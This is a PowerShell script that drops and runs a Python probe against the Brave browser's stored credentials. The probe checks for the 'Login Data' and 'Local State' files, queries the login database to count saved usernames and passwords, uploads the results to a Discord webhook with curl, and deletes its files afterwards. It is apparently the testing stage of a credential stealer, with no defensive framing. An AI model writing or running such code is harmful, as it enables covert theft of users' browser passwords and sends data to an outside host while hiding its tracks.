cd $env:TEMP\py

@'
import os
print("=== BRAVE TEST ===")

brave_path = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
print(f"Brave path: {brave_path}")
print(f"Exists: {os.path.exists(brave_path)}")

if os.path.exists(brave_path):
    default_path = os.path.join(brave_path, "Default")
    print(f"\nDefault profile: {default_path}")
    print(f"Exists: {os.path.exists(default_path)}")
    
    login_data = os.path.join(default_path, "Login Data")
    print(f"\nLogin Data: {login_data}")
    print(f"Exists: {os.path.exists(login_data)}")
    if os.path.exists(login_data):
        print(f"Size: {os.path.getsize(login_data)} bytes")
    
    local_state = os.path.join(brave_path, "Local State")
    print(f"\nLocal State: {local_state}")
    print(f"Exists: {os.path.exists(local_state)}")
    if os.path.exists(local_state):
        print(f"Size: {os.path.getsize(local_state)} bytes")

print("\n=== SQLITE TEST ===")
import sqlite3
login_data = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data")
if os.path.exists(login_data):
    try:
        conn = sqlite3.connect(login_data)
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM logins")
        total = cur.fetchone()[0]
        print(f"Total logins: {total}")
        
        cur.execute("SELECT COUNT(*) FROM logins WHERE username_value != ''")
        with_user = cur.fetchone()[0]
        print(f"With username: {with_user}")
        
        cur.execute("SELECT COUNT(*) FROM logins WHERE username_value != '' AND length(password_value) > 0")
        with_pwd = cur.fetchone()[0]
        print(f"With password: {with_pwd}")
        
        conn.close()
    except Exception as e:
        print(f"SQLite error: {e}")
'@ | Out-File "test.py" -Encoding UTF8

$result = .\python.exe test.py 2>&1 | Out-String

$result | Out-File "test_result.txt"

curl.exe -F "file=@test_result.txt" "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

Remove-Item test.py,test_result.txt -Force -EA 0
